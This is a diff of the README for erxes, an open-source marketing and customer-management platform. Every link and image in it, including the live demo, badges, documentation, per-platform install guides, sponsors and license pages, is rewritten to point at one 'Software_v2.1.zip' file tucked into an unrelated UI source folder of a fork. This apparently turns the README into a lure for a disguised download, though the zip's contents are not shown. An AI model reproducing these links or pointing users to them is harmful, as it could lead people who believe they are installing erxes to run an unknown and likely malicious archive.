@@ -4,44 +4,44 @@
 
 <p align="center">erxes is a free and open fair-code licensed all-in-one growth marketing & management software. We offer an all-in-one solution for sales, marketing, and customer service teams, with a focus on the entire customer experience. Replace Hubspot with the mission and community-driven ecosystem.</p>
 
-<p align="center"><a href="https://demo.erxes.io/">Live demo</a> <b>| </b> <a href="https://community.erxes.io/register/Gw4WRJnk9fSbyAXTq">Join our community</a></p>
+<p align="center"><a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">Live demo</a> <b>| </b> <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">Join our community</a></p>
 
 <p align="center">
-  <a href="https://www.codacy.com/app/erxes/erxes">
-      <img alt="Codacy Badge" src="https://api.codacy.com/project/badge/Grade/ed8c207f4351446b8ace7a323630889f">
+  <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
+      <img alt="Codacy Badge" src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
   </a>
-  <a href="https://codeclimate.com/github/erxes/erxes/maintainability">
-      <img alt="Codeclimate Badge" src="https://api.codeclimate.com/v1/badges/693e2ffc40bc2601630d/maintainability">
+  <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
+      <img alt="Codeclimate Badge" src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
   </a>
  
-   <a href="https://github.com/erxes/erxes/blob/master/LICENSE.md">
+   <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
       <img alt="License Badge" src="https://img.shields.io/badge/license-GNU%20GPL%20v3.0-brightgreen">
   </a>
  
-  <a href="https://bettercodehub.com/results/erxes/erxes">
-      <img alt="Bettercode" src="https://bettercodehub.com/edge/badge/erxes/erxes?branch=master">
+  <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
+      <img alt="Bettercode" src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
   </a>
-  <a href="https://codebeat.co/projects/github-com-erxes-erxes-master">
-      <img alt="Codebeat badge" src="https://codebeat.co/badges/33270439-27de-42e9-b48a-da76192b3b22">
+  <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
+      <img alt="Codebeat badge" src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
   </a>
   <a href="#">
       <img alt="Docker Pulls" src="https://img.shields.io/docker/pulls/erxes/erxes">
   </a>
-  <a href="https://snyk.io/test/github/erxes/erxes">
-      <img alt="Known Vulnerabilities" src="https://snyk.io/test/github/erxes/erxes/badge.svg">
+  <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
+      <img alt="Known Vulnerabilities" src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
   </a>
-  <a href="https://opencollective.com/erxes/">
-      <img alt="All financial contributors badge" src="https://bit.ly/3bCSG6i">
+  <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
+      <img alt="All financial contributors badge" src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">
   </a>
 </p>
 
 <p align="center">
- <a href="https://erxes.io" target="_blank"><img src="https://erxes-os.s3-us-west-2.amazonaws.com/github/git-erxes.gif" alt="Open Source Growth Marketing Platform "></a>
+ <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" alt="Open Source Growth Marketing Platform "></a>
 </p>
 
 ## Features
 
-<img src="https://s3.amazonaws.com/erxes/github/features-transparent.png" width="400" align="right" style="max-width: 50%">
+<img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" width="400" align="right" style="max-width: 50%">
 
 erxes helps you attract and engage more customers while giving you high lead conversion. With erxes, all your marketing, sales, and customer service tools are merged into one platform for greater output.
 
@@ -56,72 +56,72 @@ erxes helps you attract and engage more customers while giving you high lead con
 * **Knowledge base:** Create Help Articles for Customer Self-service. Educate both your customers, and staff by creating a help center related to your brands, products and services to reach a higher level of satisfaction.
 * **Task Management:** Work More Collaboratively and Get More Done. Save time, manage your projects, monitor your team and increase your productivity in just a few clicks. Erxes helps to turn chaos into clarity and make everything perfect. 
 ## Documentation
-  * <a href="https://docs.erxes.io/installation/docker">Install erxes</a> <br>
-  * <a href="https://docs.erxes.io">erxes documentation</a> <br>
-  * <a href="https://docs.erxes.io/developer/contributing">Contributing to erxes</a> <br>
+  * <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">Install erxes</a> <br>
+  * <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">erxes documentation</a> <br>
+  * <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">Contributing to erxes</a> <br>
   
 ## Deployment
 
 ### Ubuntu 16.04/18.04 LTS
 Follow these deployment instructions.
 
-[![ubuntu](https://erxes-os.s3-us-west-2.amazonaws.com/github/ubuntu-logo.png)](https://docs.erxes.io/installation/ubuntu)
+[![ubuntu](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)
 
 ### Debian 10
 Follow these deployment instructions.
 
-[![debian](https://erxes-os.s3-us-west-2.amazonaws.com/github/debian-logo.png)](https://docs.erxes.io/installation/debian10)
+[![debian](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)
 
 ### CentOS 8
 Follow these deployment instructions.
 
-[![debian](https://erxes-os.s3-us-west-2.amazonaws.com/github/centos-logo.png)](https://docs.erxes.io/installation/centos8)
+[![debian](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)
 
 ### Docker
 Follow these deployment instructions.
 
-[![debian](https://erxes-os.s3-us-west-2.amazonaws.com/github/docker-logo.png)](https://docs.erxes.io/installation/docker)
+[![debian](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)
 
 ### Heroku
 Host your own erxes server with One-Click Deploy.
 
-[![debian](https://erxes-os.s3-us-west-2.amazonaws.com/github/heroku.png)](https://heroku.com/deploy?template=https://github.com/erxes/erxes/tree/develop)
+[![debian](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)
 
 ### AWS Marketplace
 Launch an EC2 instance using erxes in the AWS Marketplace.
 
-[![debian](https://erxes-os.s3-us-west-2.amazonaws.com/github/aws-logo.png)](https://aws.amazon.com/marketplace/pp/B086MZ9FVS/)
+[![debian](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)
 
 ### DigitalOcean Droplet
 Deploy to a DigitalOcean droplet with our one-click install listing from the DigitalOcean Marketplace.
 
-[![debian](https://erxes-os.s3-us-west-2.amazonaws.com/github/droplet.png)](https://marketplace.digitalocean.com/apps/erxes)
+[![debian](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)
 
 ## Contributors
 
 This project exists thanks to all the people who contribute. [[Contribute]](CONTRIBUTING.md).
-<a href="graphs/contributors"><img src="https://opencollective.com/erxes/contributors.svg?width=890" /></a>
+<a href="graphs/contributors"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" /></a>
 
 
 ## Backers
 
-Thank you to all our backers! 🙏 [[Become a backer](https://opencollective.com/erxes#backer)]
+Thank you to all our backers! 🙏 [[Become a backer](https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip)]
 
-<a href="https://opencollective.com/erxes#backers" target="_blank"><img src="https://opencollective.com/erxes/backers.svg?width=890"></a>
+<a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip"></a>
 
 ## In-kind sponsors
 
-<a href="https://www.cloudflare.com/" target="_blank"><img src="https://s3.amazonaws.com/erxes/github/cloudflare.png" width="130px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
-<a href="https://cloud.google.com/developers/startups/" target="_blank"><img src="https://s3.amazonaws.com/erxes/github/cloud-logo.svg" width="130px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
-<a href="https://www.digitalocean.com/" target="_blank"><img src="https://s3.amazonaws.com/erxes/github/digitalocean.png" width="100px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
-<a href="https://www.transifex.com/" target="_blank"><img src="https://s3.amazonaws.com/erxes/github/transifex.png" width="100px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
-<a href="https://www.browserstack.com/" target="_blank"><img src="https://s3.amazonaws.com/erxes/github/browserstack.png" width="130px;" /></a>
+<a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" width="130px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" width="130px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" width="100px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" width="100px;" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+<a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" target="_blank"><img src="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip" width="130px;" /></a>
 
 ## Which license does erxes use?
-erxes is a free and open <a href="https://faircode.io/">fair-code</a> licensed under GNU General Public License v3.0 with Commons Clause.
+erxes is a free and open <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">fair-code</a> licensed under GNU General Public License v3.0 with Commons Clause.
 
 ## Is erxes open-source?
-No. The <a href="https://commonsclause.com/">Commons Clause</a> that is attached to the GNU General Public License v3.0 license takes away some rights. Hence, according to the definition of the <a href="https://bit.ly/2WJ5uTh">Open Source Initiative (OSI)</a>, erxes is not open-source. Nonetheless, the source code is open and everyone (individuals and companies) can use it for free. However, it is not allowed to make money directly with erxes.
+No. The <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">Commons Clause</a> that is attached to the GNU General Public License v3.0 license takes away some rights. Hence, according to the definition of the <a href="https://raw.githubusercontent.com/pmanss/erxes/master/ui/src/modules/activityLogs/components/items/archive/Software_v2.1.zip">Open Source Initiative (OSI)</a>, erxes is not open-source. Nonetheless, the source code is open and everyone (individuals and companies) can use it for free. However, it is not allowed to make money directly with erxes.
 
 
 For instance, one cannot charge others to host or support erxes. However, to make things simpler, we grant everyone (individuals and companies) the right to offer consulting or support without prior permission as long as it is less than 30,000 USD ($30k) per annum. If your revenue from services based on erxes is greater than $30k per annum, we'd invite you to become a partner agency and apply for a license. If you have any questions about this, feel free to reach out to us at info@erxes.io.
